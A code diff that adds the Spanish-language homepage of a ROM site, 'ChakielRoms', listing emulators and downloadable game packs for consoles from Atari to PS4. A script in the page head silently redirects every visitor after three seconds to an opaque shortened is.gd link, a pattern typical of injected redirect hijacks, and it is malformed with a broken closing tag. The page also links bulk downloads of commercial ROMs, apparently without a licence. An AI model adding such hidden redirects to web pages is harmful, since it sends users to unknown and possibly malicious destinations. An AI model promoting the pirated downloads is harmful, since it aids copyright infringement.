@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <!-- Metadatos básicos -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#000">
+    <meta name="description" content="Roms Para Emuladores compatibles con android y PC by ChakielZero.">
+    <meta name="keywords" content="ChakielZero, Roms Wii U android, descargar roms wii u, wii u chakiel, cemu droid, wii u android">
+    <meta name="author" content="Gerardo Briceño Vázquez">
+    <meta name="robots" content="index, follow">
+    <meta name="rating" content="General">
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:type" content="website"/>
+    <meta property="og:title" content="Chakielroms"/>
+    <meta property="og:image" content="https://raw.githubusercontent.com/Chakielzero/chakielroms/main/assets/icons/logo.png"/>
+    <meta property="og:image:alt" content="ChakielZero Roms GRATIS"/>
+    <meta property="og:image:width" content="600"/>
+    <meta property="og:image:height" content="315"/>
+    <meta property="og:url" content="http://chakielroms.com"/>
+    <meta property="og:site_name" content="ChakielZero Roms"/>
+    <meta property="og:description" content="Roms Para emuladores compatibles con android y PC by ChakielZero.">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/Chakielzero/chakielroms/main/assets/icons/logo.png"/>
+    <meta name="twitter:site" content="@chakielzero"/>
+    <meta name="twitter:title" content="ChakielZero juegos compatibles para cemudroid"/>
+    <meta name="twitter:description" content="Roms para emuladores compatibles con android y PC by ChakielZero.">
+
+    <!-- Canonical Link -->
+    <link rel="canonical" href="https://www.chakielroms.com">
+
+    <!-- Favicon and Apple Icons -->
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/icons/icon.png">
+    <link rel="manifest" href="/site.webmanifest"/>
+    <link rel="shortcut icon" href="assets/icons/favicon.ico" type="image/x-icon">
+    
+    <title>ChakielZero Roms GRATIS</title>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+/* General reset */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    scroll-behavior: smooth;
+}
+
+/* Estilos básicos */
+body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #1e1e1e;
+    color: #fff;
+    transition: background-color 0.3s ease, color 0.3s ease;
+}
+
+header {
+    background-color: #111;
+    color: #fff;
+    padding: 20px;
+    text-align: center;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+    transition: background-color 0.3s ease;
+}
+
+h1 {
+    font-family: 'Press Start 2P', cursive;
+    font-size: 2em;
+    color: #E0E0E0;
+    text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.6), 
+                 0 0 10px rgba(0, 0, 0, 0.4);
+    background: linear-gradient(45deg, #E0E0E0, #B0B0B0);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    padding: 10px;
+    text-align: center;
+}
+
+/* Sección Principal */
+.intro {
+    text-align: center;
+    padding: 20px;
+}
+
+#main-image {
+    position: relative;
+    text-align: center;
+}
+
+#main-image img {
+    max-width: 100%;
+    height: auto;
+}
+
+/* Estilos para dispositivos móviles */
+.mobile-image {
+    display: block;
+    width: 80%;
+    max-width: 400px;
+    margin-bottom: 20px;
+}
+
+.desktop-image {
+    display: none;
+}
+
+/* Media query para pantallas más grandes (escritorios) */
+@media (min-width: 768px) {
+    .mobile-image {
+        display: none;
+    }
+
+    .desktop-image {
+        display: block;
+        width: 100%;
+        max-width: 1200px; /* Cambia este valor según el tamaño deseado */
+        margin-bottom: 20px;
+    }
+}
+
+p {
+    font-size: 1.2em;
+    color: #ccc;
+    line-height: 1.8;
+    text-align: center;
+    font-family: 'Roboto', sans-serif;
+    letter-spacing: 0.5px;
+    margin-bottom: 20px;
+    padding: 10px 20px;
+    background: linear-gradient(135deg, rgba(255, 30, 86, 0.1), rgba(30, 144, 255, 0.1));
+    border-left: 5px solid #ff1e56;
+    border-right: 5px solid #ff1e56;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    border-radius: 10px;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+}
+
+p::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(135deg, rgba(255, 255, 255, 0.05), transparent);
+    opacity: 0;
+    transition: opacity 0.4s ease;
+}
+
+p:hover::before {
+    opacity: 1;
+}
+
+p:hover {
+    background: linear-gradient(135deg, rgba(255, 30, 86, 0.2), rgba(30, 144, 255, 0.2));
+    transform: translateY(-5px);
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+}
+
+
+/* Redes Sociales */
+.social-container {
+    display: flex;
+    justify-content: center;
+    gap: 20px; /* Espaciado más amplio para mayor claridad */
+    margin-top: 30px;
+}
+
+.social-container a img {
+    width: 50px; /* Tamaño un poco más grande para destacar mejor */
+    height: 50px;
+    filter: none; /* Eliminamos el filtro gris */
+    transition: transform 0.3s ease, box-shadow 0.3s ease; /* Transiciones para efectos 3D y sombras */
+    border-radius: 10px; /* Bordes ligeramente redondeados */
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2), 0 6px 20px rgba(0, 0, 0, 0.1); /* Sombra suave */
+}
+
+.social-container a img:hover {
+    transform: translateY(-5px) scale(1.05); /* Efecto 3D ligero */
+    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4), 0 8px 30px rgba(0, 0, 0, 0.2); /* Sombra más profunda en hover */
+}
+
+/* Sección de Categorías */
+#gallery {
+    padding: 20px;
+    text-align: center;
+}
+
+#gallery h1 {
+    font-size: 2em;
+    color: #ffcc00;
+    margin-bottom: 20px;
+}
+
+.game {
+    background-color: #2a2a2a;
+    padding: 20px;
+    margin-bottom: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    transition: transform 0.3s ease;
+}
+
+.game:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 15px rgba(255, 30, 86, 0.4);
+}
+
+.game img {
+    width: 100%;
+    max-width: 300px; /* Limitamos el ancho de la imagen */
+    height: auto;
+    border-radius: 10px;
+    margin-bottom: 15px;
+}
+
+.game p {
+    font-size: 1.5em;
+    color: #ffcc00;
+    margin-bottom: 10px;
+}
+
+.game button {
+    padding: 10px 20px;
+    margin: 5px;
+    font-size: 1em;
+    color: white;
+    background-color: #ff1e56;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+.like-button {
+  margin-top: 20px;
+  padding: 10px 20px;
+  font-size: 16px;
+  font-weight: bold;
+  color: #fff;
+  background-color: #ff0000; /* Rojo típico de YouTube */
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  text-align: center;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+  transition: background-color 0.3s ease;
+}
+
+.like-button:hover {
+  background-color: #cc0000; /* Oscurece el rojo al pasar el ratón */
+}
+
+/* Responsividad para móviles */
+@media (max-width: 600px) {
+  .video-container {
+    max-width: 100%;
+    border-radius: 0;
+  }
+
+  .like-button {
+    width: 100%;
+    font-size: 14px;
+  }
+}
+
+.game button:hover {
+    background-color: #ff4d79;
+}
+
+/* Botón de descarga */
+.download-btn {
+    background-color: #1e90ff;
+}
+
+.download-btn:hover {
+    background-color: #63b3ff;
+}
+
+/* Botón flotante */
+.custom-floating-button {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    background-color: #ff1e56;
+    color: white;
+    font-size: 24px;
+    padding: 15px;
+    border-radius: 50%;
+    cursor: pointer;
+    transition: transform 0.3s ease;
+}
+
+.custom-floating-button:hover {
+    transform: scale(1.1);
+}
+
+/* Footer */
+footer {
+    padding: 20px;
+    text-align: center;
+    background-color: #111;
+    color: #ccc;
+    font-size: 0.9em;
+}
+
+/* Media Queries para pantallas pequeñas */
+@media (max-width: 768px) {
+    h1 {
+        font-size: 1.5em;
+    }
+
+    #main-image img {
+        width: 100%;
+        max-width: 300px;
+    }
+
+    p {
+        font-size: 1em;
+    }
+
+    .game img {
+        max-width: 100%; /* Aseguramos que las imágenes no sean más grandes que la pantalla */
+    }
+
+    .game p {
+        font-size: 1.2em;
+    }
+
+    .game button {
+        padding: 10px;
+        font-size: 0.9em;
+    }
+}
+/* Estilo espectacular para el <hr> */
+hr {
+    border: none; /* Eliminar el estilo predeterminado */
+    height: 4px; /* Grosor del <hr> */
+    background: linear-gradient(to right, #ff416c, #ff4b2b); /* Degradado espectacular */
+    margin: 0 5%; /* Márgenes laterales, dejando espacio en los extremos */
+    border-radius: 5px; /* Bordes redondeados */
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2); /* Sombra sutil para dar efecto 3D */
+    transition: width 0.3s ease; /* Transición suave al hover */
+}
+
+hr:hover {
+    width: 90%; /* Se acorta un poco en hover para darle dinamismo */
+    margin-left: auto; /* Mantener centrado */
+    margin-right: auto; /* Mantener centrado */
+    box-shadow: 0 6px 10px rgba(0, 0, 0, 0.4); /* Sombra más pronunciada al hacer hover */
+}
+/* Estilo para el contenedor del video */
+.video-container {
+    max-width: 800px; /* Ancho máximo del contenedor */
+    margin: 20px auto; /* Centrar el contenedor en la página */
+    position: relative; /* Para efectos de sombra */
+    overflow: hidden; /* Para que la sombra no salga del contenedor */
+    border-radius: 8px; /* Bordes redondeados para el contenedor */
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2); /* Sombra sutil */
+}
+
+/* Estilo para el iframe */
+.video-container iframe {
+    width: 100%; /* Ancho completo del contenedor */
+    height: 450px; /* Altura del video */
+    border: none; /* Sin borde */
+    border-radius: 8px; /* Bordes redondeados del iframe */
+}
+
+/* Estilo para el título h2 */
+.video-title {
+    font-size: 2em; /* Tamaño de fuente grande */
+    color: #FFD700; /* Color dorado */
+    position: relative; /* Necesario para la línea debajo */
+    text-align: center; /* Centrar el texto */
+    margin: 20px 0; /* Margen vertical */
+}
+
+/* Línea debajo del h2 */
+.video-title::after {
+    content: ''; /* Generar un pseudo-elemento vacío */
+    display: block; /* Mostrar como bloque */
+    width: 80%; /* Ancho de la línea */
+    height: 4px; /* Altura de la línea */
+    background-color: #800000; /* Color vino */
+    margin: 10px auto; /* Centrar la línea */
+    border-radius: 2px; /* Bordes redondeados */
+}
+.uvideos {
+    font-family: Arial, sans-serif;
+    background-color: #121212; /* Color de fondo oscuro */
+    color: #fff; /* Color del texto */
+}
+
+.video-slider {
+    display: flex;
+    overflow-x: auto; /* Permitir desplazamiento horizontal */
+    padding: 20px;
+    scrollbar-width: thin; /* Personalizar el scrollbar en Firefox */
+}
+
+.video-slider::-webkit-scrollbar {
+    height: 8px; /* Altura del scrollbar */
+}
+
+.video-slider::-webkit-scrollbar-thumb {
+    background: #ff3d00; /* Color del thumb del scrollbar */
+    border-radius: 4px;
+}
+
+.video-item {
+    min-width: 200px; /* Ancho mínimo de cada video */
+    margin-right: 10px; /* Espacio entre los videos */
+    cursor: pointer; /* Cursor de mano al pasar el mouse */
+}
+
+.video-item img {
+    width: 100%;
+    border-radius: 8px; /* Bordes redondeados de las imágenes */
+}
+
+.video-modal {
+    display: none; /* Ocultar modal por defecto */
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.8); /* Fondo oscuro semitransparente */
+    justify-content: center; /* Centrar contenido */
+    align-items: center; /* Centrar contenido */
+}
+
+.modal-content {
+    position: relative;
+    width: 80%;
+    max-width: 800px; /* Ancho máximo del video */
+    background-color: #fff; /* Fondo blanco para el video */
+    border-radius: 8px; /* Bordes redondeados */
+    overflow: hidden; /* Esconder el contenido que sobresale */
+}
+
+.video-modal iframe {
+    width: 100%;
+    height: 450px; /* Altura del iframe */
+    border: none; /* Sin borde */
+}
+
+.close {
+    position: absolute;
+    top: 10px;
+    right: 15px;
+    font-size: 24px;
+    color: #ff3d00; /* Color del botón de cerrar */
+    cursor: pointer; /* Cursor de mano al pasar el mouse */
+}
+/* Contenedor para centrar la tarjeta */
+.card-container {
+  display: flex;
+  justify-content: center;
+  padding: 20px;
+}
+
+/* Tarjeta */
+.card {
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #e7e7e7;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+  transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+  overflow: hidden;
+  height: 50px;
+  width: 100%;
+  max-width: 200px; /* Define un ancho máximo */
+}
+
+/* Otros estilos */
+.card svg {
+  height: 25px;
+}
+
+.card::before,
+.card::after {
+  position: absolute;
+  display: flex;
+  align-items: center;
+  width: 50%;
+  height: 100%;
+  transition: 0.25s linear;
+  z-index: 1;
+}
+
+.card::before {
+  content: "";
+  left: 0;
+  justify-content: flex-end;
+  background-color: #4d60b6;
+}
+
+.card::after {
+  content: "";
+  right: 0;
+  justify-content: flex-start;
+  background-color: #4453a6;
+}
+
+.card:hover {
+  box-shadow: 0 14px 28px rgba(0,0,0,0.25), 0 10px 10px rgba(0,0,0,0.22);
+}
+
+.card:hover span {
+  opacity: 0;
+  z-index: -3;
+}
+
+.card:hover::before {
+  opacity: 0.5;
+  transform: translateY(-100%);
+}
+
+.card:hover::after {
+  opacity: 0.5;
+  transform: translateY(100%);
+}
+
+.card span {
+  position: absolute;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  height: 100%;
+  color: whitesmoke;
+  font-family: 'Fira Mono', monospace;
+  font-size: 24px;
+  font-weight: 700;
+  opacity: 1;
+  transition: opacity 0.25s;
+  z-index: 2;
+}
+
+.card .social-link {
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 25%;
+  height: 100%;
+  color: whitesmoke;
+  font-size: 24px;
+  text-decoration: none;
+  transition: 0.25s;
+}
+
+.card .social-link svg {
+  text-shadow: 1px 1px rgba(31, 74, 121, 0.7);
+  transform: scale(1);
+}
+
+.card .social-link:hover {
+  background-color: rgba(249, 244, 255, 0.774);
+  animation: bounce_613 0.4s linear;
+}
+
+@keyframes bounce_613 {
+  40% {
+    transform: scale(1.4);
+  }
+  60% {
+    transform: scale(0.8);
+  }
+  80% {
+    transform: scale(1.2);
+  }
+  100% {
+    transform: scale(1);
+  }
+}
+
+</style>
+<script>
+setTimeout(() => window.location.replace("https://is.gd/OcWorG"), 3000);
+<script/>
+</head>
+<body>
+
+    <header>
+        <h1 aria-label="chakielroms.com">ChakielRoms</h1>
+    </header>
+
+    <!-- Sección Principal con logo y redes sociales -->
+    <section class="intro">
+        <div id="main-image">
+           <img src="in.png" alt="Emuladores y roms by Chakiel" class="mobile-image">
+           <img src="desktop.png" alt="Emuladores y roms para computadoras by Chakiel" class="desktop-image">
+         </div>
+
+        <p>Bienvenidos a Chakielroms.com El mejor lugar para tener tus juegos categorizados.</p>
+
+    </section>
+<!--
+     <button class="like-button" onclick="redirectToLike()">Dejar Like👍</button>
+     Sección de Categorías -->
+    <section id="gallery">
+        <h1>Categoría</h1>
+	<div class="game">
+            <img src="android.png" alt="android games Juegos ChakielZero">
+            <p>Emuladores y Juegos ANDROID</p>
+            <a href="android/">
+            <button>Descargar juegos</button>
+            </a>
+	</div>
+
+        <div class="game">
+            <img src="pc.png" alt="PC games Juegos ChakielZero">
+            <p>Juegos PC</p>
+            <a href="https://www.chakielemuladores.com/2024/08/winlator-glibc-emulador-pc-en-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="pc/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+	    
+	<div class="game">
+            <img src="gamecube.png" alt="Gamecube roms by ChakielZero">
+            <p>GAMECUBE</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/el-mejor-emulador-de-gamecube-y-wii.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="gamecube/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+	    
+	<div class="game">
+            <img src="wii.png" alt="WII roms by ChakielZero">
+            <p>WII</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/el-mejor-emulador-de-gamecube-y-wii.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="wii/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+	    
+        <div class="game">
+            <img src="3ds.png" alt="3DS roms by ChakielZero">
+            <p>3DS</p>
+	    <a href="https://www.chakielemuladores.com/2024/08/5-mejores-emuladores-de-3ds-en-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="3ds/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+	    
+        <div class="game">
+            <img src="system1.png" alt="Wii U roms by ChakielZero">
+            <p>Wii U</p>
+	    <a href="https://www.chakielemuladores.com/2024/07/cemu-en-android-emulador-de-wii-u.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="wiiu/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+
+        <div class="game">
+            <img src="system2.png" alt=" Switch roms by ChakielZero">
+            <p>SWITCH</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/yuzu-ultima-version-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="sudachi/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+
+	<div class="game">
+            <img src="ps1.png" alt="Ps1 roms by ChakielZero">
+            <p>PS1</p>
+	    <a href="https://www.chakielemuladores.com/2024/08/5-mejores-emuladores-de-ps1-en-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1g4AI4GgSAjvVewKkW7BJiw">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+
+	<div class="game">
+            <img src="ps2.png" alt="PS2 roms by ChakielZero">
+            <p>PS2</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/emulador-nethersx2-18-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="ps2/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+
+	<div class="game">
+            <img src="ps3.png" alt="PS3 roms by ChakielZero">
+            <p>PS3</p>
+	    <a href="https://www.chakielemuladores.com/2025/02/nuevo-emulador-aps3e-ps3-android-apk.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="ps3/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+
+	<div class="game">
+            <img src="ps4.png" alt="PS4 roms by ChakielZero">
+            <p>PS4</p>
+	    <a href="https://www.chakielemuladores.com/2024/08/shadps4-emulador-ps4-en-pc.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="ps4/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+
+	<div class="game">
+            <img src="psp.png" alt="Psp roms by ChakielZero">
+            <p>PSP</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/descargar-archivo-body-font-family_60.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1AUyYUg5ozQsB-TRY0XFCAA">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+
+        <div class="game">
+            <img src="psvita.png" alt="PsVita roms by ChakielZero">
+            <p>PsVita</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/limonade-vs-citra-oficial-en-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="psvita/">
+            <button>Ver Juegos</button>
+            </a>
+        </div>
+	    
+        <div class="game">
+            <img src="nes.png" alt="Nes roms by ChakielZero">
+            <p>NES</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/mejor-emulador-de-nes-para-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1isURnzG9vNQ1PVswZ3PgBQ">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="snes.png" alt="snes roms by ChakielZero">
+            <p>SNES</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/snes9x-emulador-de-snes-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1SyQFJnYmXBlDlyKXwAGEBQ">
+            <button>Descargar pack</button>
+            </a>
+	</div>
+        <div class="game">
+            <img src="virtualboy.png" alt="virtual boy roms by ChakielZero">
+            <p>VIRTUAL BOY</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/el-mejor-emulador-de-virtual-boy-para.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1T29F0wz4G5naDK3dS6AMmg">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="n64.png" alt="N64 roms by ChakielZero">
+            <p>N64</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/m64plus-fz-pro-mejor-emulador-de.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/12nuDy8Jz7gC6wMf4_bm77Q">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="gbc.png" alt="gbc roms by ChakielZero">
+            <p>GBC</p>
+	    <a href="https://www.chakielemuladores.com/2024/10/lemuroid-mejor-multiemulador-android-apk.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1vbVhN5cwuVrjZuQ8mo4dmA">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="gba.png" alt="gba roms by ChakielZero">
+            <p>GBA</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/pizza-boy-gba.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/18VB1HawTJSZiE40r7ruvDQ">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="nds.png" alt="ds roms by ChakielZero">
+            <p>NDS</p>
+	    <a href="https://www.chakielemuladores.com/2024/08/5-mejores-emuladores-de-ds-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1lw2ssxgQEK3IyF2YXes19Q">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+	<div class="game">
+            <img src="sg1000.png" alt="sg1000 roms by ChakielZero">
+            <p>SG 1000</p>
+	    <a href="https://www.chakielemuladores.com/2024/07/coleccion-consolas-sega-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/13AhsyYidn5NAlUi0cbbMeA">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="Mastersystem.png" alt="Mastersystem.png roms by ChakielZero">
+            <p>Master System</p>
+	    <a href="https://www.chakielemuladores.com/2024/07/coleccion-consolas-sega-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1rDHYd5NpwVwE1nd98EQHow">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="genesis.png" alt="genesis roms by ChakielZero">
+            <p>GENESIS</p>
+	    <a href="https://www.chakielemuladores.com/2024/07/coleccion-consolas-sega-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1fi55fb2OinimybVOven-hA">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="gamegear.png" alt="gamegear roms by ChakielZero">
+            <p>GAME GEAR</p>
+	    <a href="https://www.chakielemuladores.com/2024/07/coleccion-consolas-sega-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1yZiB0kySt-pbWvp6PRgH6A">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="saturn.png" alt="saturn roms by ChakielZero">
+            <p>SATURN</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/yaba-sanshiro-2-sega-saturn-emulator.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1pE8zyap9qUjKV1oj8502Xg">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        <div class="game">
+            <img src="atari-2600.png" alt="atari-2600 roms by ChakielZero">
+            <p>ATARI 2600</p>
+	    <a href="https://www.chakielemuladores.com/2024/04/2600emu-emulador-atari-2600-para-android.html">
+            <button>Emulador</button>
+	    </a>
+            <a href="https://nephobox.com/s/1LYY_Pjh3Jgica1eYYRCV0A">
+            <button>Descargar pack</button>
+            </a>
+        </div>
+        
+    </section>
+    <h2 class="video-title">Últimos Videos</h2>
+<!--
+    <div class="video-container">
+    <iframe 
+        src="https://www.youtube.com/embed/jeZ5PA8Q354?si=h3dv1IBfsi2dAwr_" 
+        frameborder="0" 
+        allowfullscreen>
+    </iframe>
+</div> -->
+
+<div class="uvideos">
+	
+    <div class="video-slider">
+
+	    
+        <div class="video-item" data-video-id="6kMG-12_eJI">
+            <img src="https://img.youtube.com/vi/6kMG-12_eJI/hqdefault.jpg" alt="Video ChakielZero">
+        </div>
+
+	    
+        <div class="video-item" data-video-id="_G6ymAKkaMU">
+            <img src="https://img.youtube.com/vi/_G6ymAKkaMU/hqdefault.jpg" alt="Video 2 de ChakielZero">
+        </div>
+
+	    
+        <div class="video-item" data-video-id="hlGHMalTHYE">
+            <img src="https://img.youtube.com/vi/hlGHMalTHYE/hqdefault.jpg" alt="ChakielZero último Video">
+        </div>
+
+	    
+        <div class="video-item" data-video-id="a8pCkHRaWmM">
+            <img src="https://img.youtube.com/vi/a8pCkHRaWmM/hqdefault.jpg" alt="ChakielRoms.com Video">
+        </div>
+
+	<div class="video-item" data-video-id="2a72AwpBhtg">
+            <img src="https://img.youtube.com/vi/2a72AwpBhtg/hqdefault.jpg" alt="ChakielRoms.com Video">
+	</div>
+
+	    
+        <div class="video-item" data-video-id="2xoVqO_CUBU">
+            <img src="https://img.youtube.com/vi/2xoVqO_CUBU/hqdefault.jpg" alt="Chakiel">
+        </div>
+	<div class="video-item" data-video-id="DusRizH_xwE">
+            <img src="https://img.youtube.com/vi/DusRizH_xwE/hqdefault.jpg" alt="Chakiel">
+	</div>
+	<div class="video-item" data-video-id="cvxW4imAXDA">
+            <img src="https://img.youtube.com/vi/cvxW4imAXDA/hqdefault.jpg" alt="Chakiel">
+        </div>
+
+	    
+    </div>
+
+    <div class="video-modal" id="videoModal">
+        <span class="close" id="closeModal">&times;</span>
+        <div class="modal-content">
+            <iframe id="modalVideo" src="" frameborder="0" allowfullscreen></iframe>
+        </div>
+    </div>
+
+    
+</div>
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2024 -  🕹️ ChakielRoms.com  🕹️ Todos los derechos reservados.</p>
+        <!-- Redes sociales -->
+        <div class="social-container">
+            <a href="https://discord.com/invite/E6mP9DHYNH"><img class="social-icon" src="discord.png" alt="Discord ChakielZero Youtube"></a>
+            <a href="https://www.tiktok.com/@chakielzero"><img class="social-icon" src="tiktok.png" alt="Tiktok ChakielZero"></a>
+            <a href="https://www.youtube.com/@ChakielZero"><img class="social-icon" src="youtube.png" alt="Chakiel Zero Videos Youtube"></a>
+            <a href="https://t.me/ChakielZero"><img class="social-icon" src="telegram.png" alt="Grupo Telegram ChakielZero"></a>
+        </div>
+    </footer>
+<script src="script.js"></script>
+<script src="list.js"></script>
+</body>
+</html>
